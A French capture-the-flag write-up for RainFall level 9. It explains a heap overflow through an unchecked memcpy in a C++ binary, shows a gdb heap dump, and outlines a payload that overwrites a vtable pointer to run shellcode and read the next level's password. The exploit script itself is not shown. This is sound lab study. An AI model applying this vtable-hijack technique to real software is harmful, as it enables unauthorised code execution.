# Level 9

Pour ce niveau pour la premiere fois depuis le projet on a faire avec un executable en `C++`

Apres l'avoir decortiquer avec `ghidra` ce que fait l'executable est d'alloue sur la `heap` deux instances d'une classe nommee `N` avec 3 methodes:`setAnnotation`, deux operateur virtuel `+` et `-`
puis deux membres: un `entier` et un `buffer`

La porte d'entree pour exploiter une faille se trouve dans la methode `setAnnotation` copiant `argv[1]` dans le buffer avec `memcpy` sans faire un check sur la taille envoyer en parametre

Voici un apercu de la heap

```bash
(gdb) b *0x08048698
Breakpoint 1 at 0x8048698
(gdb) r AAAAAAAAAAAAAAAAAA
Starting program: /home/user/level9/level9 AAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048698 in main ()
(gdb) x/56wx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141
0x804a010:	0x41414141	0x41414141	0x41414141	0x00004141
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d0:	0x00000000	0x00000000	0x00000000	0x00000000
```

On apercois les metadata du chunk, le buffer et la partie qui va nous interesse pour ce niveau l'adresse de la vtable

La solution est donc de provoquer un overflow puis ecraser le pointeur de vtable de la deuxieme instance pour qu’il pointe vers une fausse vtable controlee

Notre payload sera donc composer de: 
- L'adresse de notre shellcode qui sera ecrit dans vtable[0]
- Notre shellcode
- Padding necessaire
- L'adresse du debut de notre buffer

Lors de l’appel a l’operateur virtuel le programme lit le pointeur de vtable puis appelle la premiere entree de cette table et execute notre shellcode

```bash
level9@RainFall:~$ ./level9 $(python /tmp/exploit.py)
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
************************************************
```